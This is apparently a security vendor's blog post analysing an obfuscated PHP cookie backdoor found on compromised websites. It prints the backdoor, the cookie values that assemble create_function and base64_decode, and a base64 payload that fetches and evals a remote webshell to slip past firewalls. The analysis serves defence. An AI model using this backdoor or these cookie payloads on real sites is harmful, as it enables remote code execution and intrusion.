---
layout: post
title: "Firewall bypass using cookies and superglobal PHP variables"
date: 2020-05-26 09:00:00 -0700
cover: /assets/images/firewall-bypass-using-cookies-and-superglobal-PHP-variables/cover.png
excerpt: Attackers need to send requests to their uploaded malware, but how can they do so without triggering a firewall? This is one bypass method...
authors:
  - name: Luke Leal
    title: Security Engineer, Sucuri
    url: https://twitter.com/rootprivilege
    photo: https://avatars.githubusercontent.com/sucuri-luke
---

When we investigate compromised websites, it's not unusual to find malicious files that have been obfuscated through encoding or encryption — however, these are not the only methods that attackers use to obfuscate and execute their malware within compromised environments.

## Obfuscation techniques using PHP variables

For example, here's an obfuscation sample found during a recent investigation which doesn't use any encoding or encryption at all.

<div style="background: #202020; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%; white-space: pre-wrap;"> <span style="color: #40ffff">$x</span><span style="color: #d0d0d0">=</span><span style="color: #ed9d13">'_C'</span><span style="color: #d0d0d0">;</span><span style="color: #40ffff">$v</span><span style="color: #d0d0d0">=</span><span style="color: #ed9d13">'OO'</span><span style="color: #d0d0d0">;</span><span style="color: #999999; font-style: italic">/*5h*/</span><span style="color: #40ffff">$o</span><span style="color: #d0d0d0">=</span><span style="color: #ed9d13">'KI'</span><span style="color: #d0d0d0">;</span><span style="color: #999999; font-style: italic">/*{*Z*/</span><span style="color: #40ffff">$qv</span><span style="color: #d0d0d0">=</span><span style="color: #ed9d13">'E'</span><span style="color: #d0d0d0">;</span><span style="color: #40ffff">$j</span><span style="color: #999999; font-style: italic">/*8i$7*/</span><span style="color: #d0d0d0">=</span><span style="color: #a61717; background-color: #e3d2d2">$</span><span style="color: #d0d0d0">{</span><span style="color: #40ffff">$x</span><span style="color: #d0d0d0">.</span><span style="color: #40ffff">$v</span><span style="color: #d0d0d0">.</span><span style="color: #40ffff">$o</span><span style="color: #d0d0d0">.</span><span style="color: #40ffff">$qv</span><span style="color: #d0d0d0">};</span><span style="color: #6ab825; font-weight: bold">if</span><span style="color: #d0d0d0">(</span><span style="color: #24909d">isset</span><span style="color: #d0d0d0">(</span><span style="color: #40ffff">$j</span><span style="color: #999999; font-style: italic">/*f(UZ*/</span><span style="color: #d0d0d0">[</span><span style="color: #ed9d13">'Q'</span><span style="color: #d0d0d0">])){</span><span style="color: #40ffff">$oo</span><span style="color: #d0d0d0">=</span><span style="color: #40ffff">$j</span><span style="color: #999999; font-style: italic">/*Mr*/</span><span style="color: #d0d0d0">[</span><span style="color: #ed9d13">'Q'</span><span style="color: #d0d0d0">].</span><span style="color: #40ffff">$j</span><span style="color: #d0d0d0">[</span><span style="color: #ed9d13">'J'</span><span style="color: #d0d0d0">];</span><span style="color: #40ffff">$tj</span><span style="color: #d0d0d0">=/*m5d*/</span><span style="color: #40ffff">$j</span><span style="color: #d0d0d0">[</span><span style="color: #ed9d13">'St'</span><span style="color: #d0d0d0">].</span><span style="color: #40ffff">$j</span><span style="color: #d0d0d0">[</span><span style="color: #ed9d13">'V'</span><span style="color: #d0d0d0">].</span><span style="color: #40ffff">$j</span><span style="color: #d0d0d0">[</span><span style="color: #ed9d13">'x'</span><span style="color: #d0d0d0">];</span><span style="color: #40ffff">$pd</span><span style="color: #d0d0d0">=</span><span style="color: #40ffff">$oo</span><span style="color: #d0d0d0">(</span><span style="color: #ed9d13">''</span><span style="color: #d0d0d0">,</span><span style="color: #40ffff">$tj</span><span style="color: #d0d0d0">(</span><span style="color: #40ffff">$j</span><span style="color: #d0d0d0">[</span><span style="color: #ed9d13">'U'</span><span style="color: #d0d0d0">]));</span><span style="color: #40ffff">$pd</span><span style="color: #d0d0d0">();}</span></pre></div>

Instead, this example splits a predefined PHP variable, **$_COOKIE**, into segmented strings assigned to variables before concatenating them. It also uses code comments and meaningless variable names to generate confusion, making it more difficult to logically read the code.

This obfuscation technique also uses a PHP array, allowing the attacker to pass data to the PHP script via HTTP cookies so that arbitrary code can be executed.

These techniques aren't very easy to see right off the bat, but the malicious behavior becomes more obvious when we remove the code comments, beautify the code, and split it into two sections.

<div style="background: #202020; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%; white-space: pre-wrap;">
<span style="color: #40ffff">$x</span> <span style="color: #d0d0d0">=</span> <span style="color: #ed9d13">'_C'</span><span style="color: #d0d0d0">;</span>
<span style="color: #40ffff">$v</span> <span style="color: #d0d0d0">=</span> <span style="color: #ed9d13">'OO'</span><span style="color: #d0d0d0">;</span>
<span style="color: #40ffff">$o</span> <span style="color: #d0d0d0">=</span> <span style="color: #ed9d13">'KI'</span><span style="color: #d0d0d0">;</span>
<span style="color: #40ffff">$qv</span> <span style="color: #d0d0d0">=</span> <span style="color: #ed9d13">'E'</span><span style="color: #d0d0d0">;</span>
<span style="color: #40ffff">$j</span> <span style="color: #d0d0d0">=</span> <span style="color: #a61717; background-color: #e3d2d2">$</span><span style="color: #d0d0d0">{</span><span style="color: #40ffff">$x</span> <span style="color: #d0d0d0">.</span> <span style="color: #40ffff">$v</span> <span style="color: #d0d0d0">.</span> <span style="color: #40ffff">$o</span> <span style="color: #d0d0d0">.</span> <span style="color: #40ffff">$qv</span><span style="color: #d0d0d0">};</span>
</pre></div>

The first section of the code contains the variables **$x**, **$v**, **$o**, and **$qv** which are used to contain the segmented strings. The strings are concatenated with the **.** operator in the **$j** variable to generate the **[$_COOKIE](https://www.php.net/manual/en/reserved.variables.cookies.php)** PHP predefined variable.

This is a crucial part of the malware. The attacker simply places their predefined PHP functions and data into HTTP cookies, which are then passed along to the script in their HTTP request.

## Malicious data in HTTP requests

Here's how attackers are able to pass along data in their malicious code:

<div style="background: #202020; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">
<span style="color: #6ab825; font-weight: bold">if</span> <span style="color: #d0d0d0">(</span><span style="color: #24909d">isset</span><span style="color: #d0d0d0">(</span><span style="color: #40ffff">$j</span><span style="color: #d0d0d0">[</span><span style="color: #ed9d13">'Q'</span><span style="color: #d0d0d0">]))</span>
<span style="color: #d0d0d0">{</span>
<span style="color: #40ffff">$oo</span> <span style="color: #d0d0d0">=</span> <span style="color: #40ffff">$j</span><span style="color: #d0d0d0">[</span><span style="color: #ed9d13">'Q'</span><span style="color: #d0d0d0">]</span> <span style="color: #d0d0d0">.</span> <span style="color: #40ffff">$j</span><span style="color: #d0d0d0">[</span><span style="color: #ed9d13">'J'</span><span style="color: #d0d0d0">];</span>
<span style="color: #40ffff">$tj</span> <span style="color: #d0d0d0">=</span> <span style="color: #40ffff">$j</span><span style="color: #d0d0d0">[</span><span style="color: #ed9d13">'St'</span><span style="color: #d0d0d0">]</span> <span style="color: #d0d0d0">.</span> <span style="color: #40ffff">$j</span><span style="color: #d0d0d0">[</span><span style="color: #ed9d13">'V'</span><span style="color: #d0d0d0">]</span> <span style="color: #d0d0d0">.</span> <span style="color: #40ffff">$j</span><span style="color: #d0d0d0">[</span><span style="color: #ed9d13">'x'</span><span style="color: #d0d0d0">];</span>
<span style="color: #40ffff">$pd</span> <span style="color: #d0d0d0">=</span> <span style="color: #40ffff">$oo</span><span style="color: #d0d0d0">(</span><span style="color: #ed9d13">''</span><span style="color: #d0d0d0">,</span> <span style="color: #40ffff">$tj</span><span style="color: #d0d0d0">(</span><span style="color: #40ffff">$j</span><span style="color: #d0d0d0">[</span><span style="color: #ed9d13">'U'</span><span style="color: #d0d0d0">]));</span>
<span style="color: #40ffff">$pd</span><span style="color: #d0d0d0">();</span>
<span style="color: #d0d0d0">}</span>
</pre></div>

This sample starts off with an **if** statement, which checks for the existence of the HTTP cookie with the name **Q**.

If the incoming HTTP request does not contain this cookie, then the PHP code simply stops there.

If the request **does** contain a **Q** cookie, the code creates three new variables **$oo**, **$tj**, and **$pd**. These variables are produced from segmented data provided by the attacker's HTTP cookies **Q**, **J**, **St**, **V**, **x**, and **U**, which are concatenated to form executable code.

Since the attacker is responsible for supplying these variable definitions, the script offers a lot of flexibility to define whatever code they want to execute.

In this particular example, the format and execution of the **$pd** variable indicates that bad actors are leveraging the PHP function **[create_function](https://www.php.net/manual/en/function.create-function)** to form their requests.

### The cookie assembly line

The attacker uses a number of superglobal PHP variables to construct the data. Strings stored in cookies **Q** and **J** are assembled using **create_function** and assigned to the **$oo** variable.

The **$tj** variable is defined by the attacker's data found within the HTTP cookies **St**, **V**, and **x**. Unlike the **$oo** variable,, the **$tj** variable offers a lot more flexibility since it isn't limited to the single PHP function **create_function**. The attacker can essentially use whatever they like for the **$tj** variable.

One important item to keep in mind is that whatever function the attacker chooses to use here will have to execute on the data provided by the final cookie — **U**. For this example, I chose to use the function **base64_decode** which means that the **U** cookie will need to be encoded with [base64](https://en.wikipedia.org/wiki/Base64) to properly execute.

So far, we've identified a value for each cookie except for the last one, **U**.

<div style="background: #202020; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">
<span style="color: #40ffff">Q</span><span style="color: #d0d0d0">=create_;</span>
<span style="color: #40ffff">J</span><span style="color: #d0d0d0">=function;</span>
<span style="color: #40ffff">St</span><span style="color: #d0d0d0">=base;</span>
<span style="color: #40ffff">V</span><span style="color: #d0d0d0">=</span><span style="color: #d0d0d0">64</span><span style="color: #d0d0d0">_;</span>
<span style="color: #40ffff">x</span><span style="color: #d0d0d0">=decode;</span></pre></div>

Cookie values don't have to exactly match the example shown above, but when concatenated they **do** need to match the name of the intended PHP function.

For example, an attacker could define **Q** to be **creat** and **J** to be **e_function** — when concatenated, these two variables will end up being **create_function**, which they can then use to create a new function for execution.

### Arbitrary PHP code submission

To complete the obfuscation, we have just a single HTTP cookie left to define — **U**.

The data assigned to this **U** variable is the PHP code created by **create_function** and executed by **$pd()**. This cookie is what grants the attacker so much flexibility, allowing them to store any malicious PHP code that they want to execute.

For this scenario, I wanted to demonstrate how an attacker can submit arbitrary code passed in their HTTP request to the malicious file, so I chose to use the following PHP snippet.
<div style="background: #202020; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">
<span style="color: #6ab825; font-weight: bold">eval</span><span style="color: #d0d0d0">(</span><span style="color: #24909d">base64_decode</span><span style="color: #d0d0d0">(</span><span style="color: #40ffff">$_COOKIE</span><span style="color: #d0d0d0">[</span><span style="color: #ed9d13">'cmd'</span><span style="color: #d0d0d0">]));</span></pre></div>

It's worth mentioning that HTTP cookies are generally limited to 4,096 characters or less, so copying and pasting an entire PHP webshell's source code into the **U** character wouldn't work. And don't forget that the **U** cookie value will need to be base64 encoded so that the **$tj** variable can successfully run its **base64_decode** function on **U**'s value.

When base64 encoded, the **U** cookie looks like this.
<div style="background: #202020; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">
<span style="color: #40ffff">U</span><span style="color: #d0d0d0">=ZXZhbChiYXNlNjRfZGVjb2RlKCRfQ09PS0lFWydjbWQnXSkpOw==</span>
</pre></div>
Okay, we now have all of the HTTP cookie values defined. When the variables are replaced with the actual concatenated values, the executed PHP code looks like this.

![alt_text](/engineering/assets/images/firewall-bypass-using-cookies-and-superglobal-PHP-variables/php-code.png "PHP Code")

The only thing left for the attacker to do is decide on the arbitrary base64 encoded PHP that they want to provide in their HTTP request. This is accomplished by defining the **cmd** cookie value.

### Base64 encoded "cmd" cookie

For this scenario, I chose to use the following code to load a PHP webshell from a third party URL into the PHP process on the infected website. This is performed without actually writing the PHP webshell to a file on the disk.
<div style="background: #202020; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">
<span style="color: #40ffff">$a</span> <span style="color: #d0d0d0">=</span> <span style="color: #24909d">file_get_contents</span><span style="color: #d0d0d0">(</span><span style="color: #ed9d13">'https://[redacted].com/files/shell.txt'</span><span style="color: #d0d0d0">);</span><span style="color: #6ab825; font-weight: bold">eval</span><span style="color: #d0d0d0">(</span><span style="color: #ed9d13">'?>'</span><span style="color: #d0d0d0">.</span><span style="color: #40ffff">$a</span><span style="color: #d0d0d0">);</span>
</pre></div>

When this PHP code is then base64 encoded and added as the value for the **cmd** cookie, it will look like this.
<div style="background: #202020; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">
<span style="color: #40ffff">cmd</span><span style="color: #d0d0d0">=JGEgPSBmaWxlX2dldF9jb250ZW50cygnaHR0cHM6Ly9bcmVkYWN0ZWRdL2ZpbGVzL3NoZWxsLnR4dCcpO2V2YWwoJz8+Jy4kYSk7</span></pre></div>

## Loading PHP webshells from third-party sources

Now that the attacker has defined all of the **Q**, **J**, **St**, **V**, **x**, and **U** cookies with their proper values along with the arbitrary code that they want executed, the last thing left to do is to send a very specific request to the malicious file found at the beginning of the post.

When the attacker's specially crafted HTTP request is sent to the malicious file, it executes everything provided by the HTTP request and its cookies, which in turn loads a PHP webshell from a remote third party source!

![alt_text](/engineering/assets/images/firewall-bypass-using-cookies-and-superglobal-PHP-variables/php-shell.png "PHP Shell")

### Detecting legitimate and malicious requests

Attackers are using this obfuscation method to bypass any security controls that inspect incoming HTTP requests — for example, the controls found in web application firewalls. By passing the malicious PHP code through base64 encoded HTTP cookies instead of **GET** or **POST** parameters, the attacker can bypass web application firewalls that don't inspect cookie contents.

It's much more common for a legitimate request from a visitor to contain a cookie that is base64 encoded than it is for a visitor to be submitting base64 encoded URL parameters in an HTTP request. As a result, this technique is less suspicious and has a higher success rate — malicious requests have a lower chance of being blocked since they contain 0 parameters in the URL and exist solely within the cookie encoded values.